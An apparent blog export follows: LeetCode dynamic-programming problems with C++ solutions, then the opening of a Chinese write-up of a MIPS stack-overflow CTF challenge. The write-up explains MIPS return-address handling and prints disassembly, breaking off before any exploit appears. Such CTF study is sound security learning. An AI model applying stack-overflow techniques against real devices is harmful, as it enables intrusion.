<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">rob</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result = <span class="built_in">robtree</span>(root);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(result[<span class="number">0</span>], result[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">robtree</span><span class="params">(TreeNode* cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">nullptr</span>) <span class="keyword">return</span> vector&lt;<span class="keyword">int</span>&gt;&#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; left = <span class="built_in">robtree</span>(cur-&gt;left);</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; right = <span class="built_in">robtree</span>(cur-&gt;right);</span><br><span class="line">        <span class="keyword">int</span> val1 = cur-&gt;val + left[<span class="number">0</span>] + right[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> val2 = <span class="built_in">max</span>(left[<span class="number">0</span>], left[<span class="number">1</span>]) + <span class="built_in">max</span>(right[<span class="number">0</span>], right[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> &#123;val2, val1&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="1035-Uncrossed-Lines"><a href="#1035-Uncrossed-Lines" class="headerlink" title="1035. Uncrossed Lines"></a>1035. Uncrossed Lines</h3><p><strong>Description:</strong></p>
<p>You are given two integer arrays <code>nums1</code> and <code>nums2</code>. We write the integers of <code>nums1</code> and <code>nums2</code> (in the order they are given) on two separate horizontal lines.</p>
<p>We may draw connecting lines: a straight line connecting two numbers <code>nums1[i]</code> and <code>nums2[j]</code> such that:</p>
<ul>
<li><code>nums1[i] == nums2[j]</code>, and</li>
<li>the line we draw does not intersect any other connecting (non-horizontal) line.</li>
</ul>
<p>Note that a connecting line cannot intersect even at the endpoints (i.e., each number can only belong to one connecting line).</p>
<p>Return <em>the maximum number of connecting lines we can draw in this way</em>.</p>
<p><strong>Example 1:</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2019/04/26/142.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums1 = [1,4,2], nums2 = [1,2,4]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: We can draw 2 uncrossed lines as in the diagram.</span><br><span class="line">We cannot draw 3 uncrossed lines, because the line from nums1[1] = 4 to nums2[2] = 4 will intersect the line from nums1[2]=2 to nums2[1]=2.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums1 = [2,5,1,2,5], nums2 = [10,5,2,1,5,2]</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums1 = [1,3,7,1,7,5], nums2 = [1,9,2,5,1]</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= nums1.length, nums2.length &lt;= 500</code></li>
<li><code>1 &lt;= nums1[i], nums2[j] &lt;= 2000</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int maxUncrossedLines(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123;</span><br><span class="line">        int len1 = nums1.size(), len2 = nums2.size();</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; dp(len1+1, vector&lt;int&gt;(len2+1, 0));</span><br><span class="line">        for (int i = 1; i &lt;= len1; i++) &#123;</span><br><span class="line">            for (int j = 1; j &lt;= len2; j++) &#123;</span><br><span class="line">                if (nums1[i-1] == nums2[j-1])   dp[i][j] = dp[i-1][j-1] + 1;</span><br><span class="line">                else    dp[i][j] = max(dp[i-1][j], dp[i][j-1]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="53-Maximum-Subarray"><a href="#53-Maximum-Subarray" class="headerlink" title="53. Maximum Subarray"></a>53. Maximum Subarray</h3><p><strong>Description:</strong></p>
<p>Given an integer array <code>nums</code>, find the subarray with the largest sum, and return <em>its sum</em>.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [-2,1,-3,4,-1,2,1,-5,4]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: The subarray [4,-1,2,1] has the largest sum 6.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The subarray [1] has the largest sum 1.</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [5,4,-1,7,8]</span><br><span class="line">Output: 23</span><br><span class="line">Explanation: The subarray [5,4,-1,7,8] has the largest sum 23.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>-104 &lt;= nums[i] &lt;= 104</code></li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(len+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> ans = dp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>] + nums[i], nums[i]);</span><br><span class="line">            ans = <span class="built_in">max</span>(dp[i], ans);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="392-Is-Subsequence"><a href="#392-Is-Subsequence" class="headerlink" title="392. Is Subsequence"></a>392. Is Subsequence</h3><p><strong>Description:</strong></p>
<p>Given two strings <code>s</code> and <code>t</code>, return <code>true</code> <em>if</em> <code>s</code> <em>is a <strong>subsequence</strong> of</em> <code>t</code><em>, or</em> <code>false</code> <em>otherwise</em>.</p>
<p>A <strong>subsequence</strong> of a string is a new string that is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (i.e., <code>&quot;ace&quot;</code> is a subsequence of <code>&quot;abcde&quot;</code> while <code>&quot;aec&quot;</code> is not).</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;abc&quot;, t = &quot;ahbgdc&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;axc&quot;, t = &quot;ahbgdc&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>0 &lt;= s.length &lt;= 100</code></li>
<li><code>0 &lt;= t.length &lt;= 104</code></li>
<li><code>s</code> and <code>t</code> consist only of lowercase English letters.</li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubsequence</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slen = s.<span class="built_in">length</span>(), tlen = t.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(slen+<span class="number">1</span>, vector&lt;<span class="keyword">int</span>&gt;(tlen+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= slen; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= tlen; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i<span class="number">-1</span>] == t[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dp[slen][tlen] == slen) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h3 id="115-Distinct-Subsequences"><a href="#115-Distinct-Subsequences" class="headerlink" title="115. *Distinct Subsequences"></a>115. *Distinct Subsequences</h3><p><strong>Description:</strong></p>
<p>Given two strings <code>s</code> and <code>t</code>, return <em>the number of distinct</em> </p>
<p>*<strong>subsequences*</strong></p>
<p> <em>of</em> <code>s</code> <em>which equals</em> <code>t</code>.</p>
<p>The test cases are generated so that the answer fits on a 32-bit signed integer.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;rabbbit&quot;, t = &quot;rabbit&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation:</span><br><span class="line">As shown below, there are 3 ways you can generate &quot;rabbit&quot; from s.</span><br><span class="line">rabbbit</span><br><span class="line">rabbbit</span><br><span class="line">rabbbit</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;babgbag&quot;, t = &quot;bag&quot;</span><br><span class="line">Output: 5</span><br><span class="line">Explanation:</span><br><span class="line">As shown below, there are 5 ways you can generate &quot;bag&quot; from s.</span><br><span class="line">babgbag</span><br><span class="line">babgbag</span><br><span class="line">babgbag</span><br><span class="line">babgbag</span><br><span class="line">babgbag</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= s.length, t.length &lt;= 1000</code></li>
<li><code>s</code> and <code>t</code> consist of English letters.</li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numDistinct</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len1 = s.<span class="built_in">length</span>(), len2 = t.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">uint64_t</span>&gt;&gt; <span class="built_in">dp</span>(len1+<span class="number">1</span>, vector&lt;<span class="keyword">uint64_t</span>&gt;(len2+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len2; i++) &#123;</span><br><span class="line">            dp[<span class="number">1</span>][i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= len2; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i<span class="number">-1</span>] == t[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>] + dp[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="583-Delete-Operation-for-Two-Strings"><a href="#583-Delete-Operation-for-Two-Strings" class="headerlink" title="583. Delete Operation for Two Strings"></a>583. Delete Operation for Two Strings</h3><p><strong>Description:</strong></p>
<p>Given two strings <code>word1</code> and <code>word2</code>, return <em>the minimum number of <strong>steps</strong> required to make</em> <code>word1</code> <em>and</em> <code>word2</code> <em>the same</em>.</p>
<p>In one <strong>step</strong>, you can delete exactly one character in either string.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: word1 = &quot;sea&quot;, word2 = &quot;eat&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: You need one step to make &quot;sea&quot; to &quot;ea&quot; and another step to make &quot;eat&quot; to &quot;ea&quot;.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: word1 = &quot;leetcode&quot;, word2 = &quot;etco&quot;</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= word1.length, word2.length &lt;= 500</code></li>
<li><code>word1</code> and <code>word2</code> consist of only lowercase English letters.</li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len1 = word1.<span class="built_in">length</span>(), len2 = word2.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">uint64_t</span>&gt;&gt; <span class="built_in">dp</span>(len1+<span class="number">1</span>, vector&lt;<span class="keyword">uint64_t</span>&gt;(len2+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= len2; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (word1[i<span class="number">-1</span>] == word2[j<span class="number">-1</span>])   dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span>    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len1 - dp[len1][len2] + len2 - dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="72-Edit-Distance"><a href="#72-Edit-Distance" class="headerlink" title="72. Edit Distance"></a>72. Edit Distance</h3><p><strong>Description:</strong></p>
<p>Given two strings <code>word1</code> and <code>word2</code>, return <em>the minimum number of operations required to convert <code>word1</code> to <code>word2</code></em>.</p>
<p>You have the following three operations permitted on a word:</p>
<ul>
<li>Insert a character</li>
<li>Delete a character</li>
<li>Replace a character</li>
</ul>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: word1 = &quot;horse&quot;, word2 = &quot;ros&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: </span><br><span class="line">horse -&gt; rorse (replace &#x27;h&#x27; with &#x27;r&#x27;)</span><br><span class="line">rorse -&gt; rose (remove &#x27;r&#x27;)</span><br><span class="line">rose -&gt; ros (remove &#x27;e&#x27;)</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: word1 = &quot;intention&quot;, word2 = &quot;execution&quot;</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: </span><br><span class="line">intention -&gt; inention (remove &#x27;t&#x27;)</span><br><span class="line">inention -&gt; enention (replace &#x27;i&#x27; with &#x27;e&#x27;)</span><br><span class="line">enention -&gt; exention (replace &#x27;n&#x27; with &#x27;x&#x27;)</span><br><span class="line">exention -&gt; exection (replace &#x27;n&#x27; with &#x27;c&#x27;)</span><br><span class="line">exection -&gt; execution (insert &#x27;u&#x27;)</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>0 &lt;= word1.length, word2.length &lt;= 500</code></li>
<li><code>word1</code> and <code>word2</code> consist of lowercase English letters.</li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len1 = word1.<span class="built_in">length</span>(), len2 = word2.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(len1+<span class="number">1</span>, vector&lt;<span class="keyword">int</span>&gt;(len2+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= len2; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= len2; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (word1[i<span class="number">-1</span>] == word2[j<span class="number">-1</span>]) &#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(&#123;dp[i<span class="number">-1</span>][j<span class="number">-1</span>], dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]&#125;) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="647-Palindromic-Substrings"><a href="#647-Palindromic-Substrings" class="headerlink" title="647. Palindromic Substrings"></a>647. Palindromic Substrings</h3><p><strong>Description:</strong></p>
<p>Given a string <code>s</code>, return <em>the number of <strong>palindromic substrings</strong> in it</em>.</p>
<p>A string is a <strong>palindrome</strong> when it reads the same backward as forward.</p>
<p>A <strong>substring</strong> is a contiguous sequence of characters within the string.</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;abc&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: Three palindromic strings: &quot;a&quot;, &quot;b&quot;, &quot;c&quot;.</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: s = &quot;aaa&quot;</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: Six palindromic strings: &quot;a&quot;, &quot;a&quot;, &quot;a&quot;, &quot;aa&quot;, &quot;aa&quot;, &quot;aaa&quot;.</span><br></pre></td></tr></table></figure>

<p><strong>Constraints:</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 1000</code></li>
<li><code>s</code> consists of lowercase English letters.</li>
</ul>
<p><strong>Code:</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.<span class="built_in">length</span>(), result = <span class="number">0</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">bool</span>&gt;&gt; <span class="built_in">dp</span>(len, vector&lt;<span class="keyword">bool</span>&gt;(len, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; len; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[i] == s[j]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j - i &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        result++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (dp[i+<span class="number">1</span>][j<span class="number">-1</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        result++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>LeetCode</tag>
        <tag>Dynamic Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>MIPS栈溢出入门</title>
    <url>/2021/11/08/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>这是去年HWS夏令营的一道MIPS栈溢出题目，当时连PWN都还没入门的我欠下的坑，如今一年后补坑，不过我也半年多没有真正意义上做一道PWN题了，现在重新捡起二进制，入坑IoT安全！</p>
<p>上题：没有开保护，是一个MIPS小端程序</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gw70fm70gmj31ls0gotcp.jpg" alt="image-20211107233715224"></p>
<p>MIPS汇编函数调用结构特点（举例这里main函数的）：</p>
<p>我的理解是：相对于x86而言，进入函数调用后，MIPS是通过专门的寄存器来保存调用之前的状态，比如这里，通过sp寄存器来分配main函数要用到的栈空间，ra用来保存调用main函数完后的返回地址，如果main函数内部不再调用子函数了，那么ra就在保存main函数的返回地址上发挥了一次作用而已，因为最后会把之前压入的返回地址又还给ra，最后jr $ra跳转到返回地址。如果main函数内有调用子函数，那么ra不光是最后作为跳转到返回地址的中间桥梁，而且中途还帮助别的函数做了一次跳板。原理和x86都是一样的，只不过MIPS多了专门的寄存器用来保存帧栈，不像x86是通过压栈出栈的方式来保存变量的栈空间和返回地址的跳转。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00400AEC main:</span><br><span class="line">.text:00400AEC                 addiu   $sp, -0x28</span><br><span class="line">.text:00400AF0                 sw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400AF4                 sw      $fp, 0x20+var_s0($sp)</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.text:00400BE4                 addi    $fp, 4</span><br><span class="line">.text:00400BE8                 lw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400BEC                 lw      $fp, 0x20+var_s0($sp)</span><br><span class="line">.text:00400BF0                 addiu   $sp, 0x28</span><br><span class="line">.text:00400BF4                 jr      $ra</span><br></pre></td></tr></table></figure>

<p>main汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00400AEC  # =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00400AEC</span><br><span class="line">.text:00400AEC  # Attributes: bp-based frame fpd=0x20</span><br><span class="line">.text:00400AEC</span><br><span class="line">.text:00400AEC  # int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00400AEC                 .globl main</span><br><span class="line">.text:00400AEC main:                                    # DATA XREF: LOAD:00400388↑o</span><br><span class="line">.text:00400AEC                                          # _ftext+18↑o ...</span><br><span class="line">.text:00400AEC</span><br><span class="line">.text:00400AEC var_10          = -0x10</span><br><span class="line">.text:00400AEC var_8           = -8</span><br><span class="line">.text:00400AEC var_s0          =  0</span><br><span class="line">.text:00400AEC var_s4          =  4</span><br><span class="line">.text:00400AEC</span><br><span class="line">.text:00400AEC                 addiu   $sp, -0x28</span><br><span class="line">.text:00400AF0                 sw      $ra, 0x20+var_s4($sp)</span><br><span class="line">.text:00400AF4                 sw      $fp, 0x20+var_s0($sp)</span><br><span class="line">.text:00400AF8                 move    $fp, $sp</span><br><span class="line">.text:00400AFC                 li      $gp, 0x418E50</span><br><span class="line">.text:00400B04                 sw      $gp, 0x20+var_10($sp)</span><br><span class="line">.text:00400B08                 la      $v0, stdin</span><br><span class="line">.text:00400B0C                 lw      $v0, (stdin - 0x410F08)($v0)</span><br><span class="line">.text:00400B10                 move    $a1, $zero</span><br><span class="line">.text:00400B14                 move    $a0, $v0</span><br><span class="line">.text:00400B18                 la      $v0, setbuf</span><br><span class="line">.text:00400B1C                 move    $t9, $v0</span><br><span class="line">.text:00400B20                 jalr    $t9 ; setbuf</span><br><span class="line">.text:00400B24                 nop</span><br><span class="line">.text:00400B28                 lw      $gp, 0x20+var_10($fp)</span><br><span class="line">.text:00400B2C                 la      $v0, stdout</span><br><span class="line">.text:00400B30                 lw      $v0, (stdout - 0x410F18)($v0)</span><br><span class="line">.text:00400B34                 move    $a1, $zero</span><br><span class="line">.text:00400B38                 move    $a0, $v0</span><br><span class="line">.text:00400B3C                 la      $v0, setbuf</span><br><span class="line">.text:00400B40                 move    $t9, $v0</span><br><span class="line">.text:00400B44                 jalr    $t9 ; setbuf</span><br><span class="line">.text:00400B48                 nop</span><br><span class="line">.text:00400B4C                 lw      $gp, 0x20+var_10($fp)</span><br><span class="line">.text:00400B50                 lui     $v0, 0x40  # &#x27;@&#x27;</span><br><span class="line">.text:00400B54                 addiu   $a0, $v0, (a33m - 0x400000)  # &quot;\x1B[33m&quot;</span><br><span class="line">.text:00400B58                 la      $v0, printf</span><br><span class="line">.text:00400B5C                 move    $t9, $v0</span><br><span class="line">.text:00400B60                 jalr    $t9 ; printf</span><br><span class="line">.text:00400B64                 nop</span><br><span class="line">.text:00400B68                 lw      $gp, 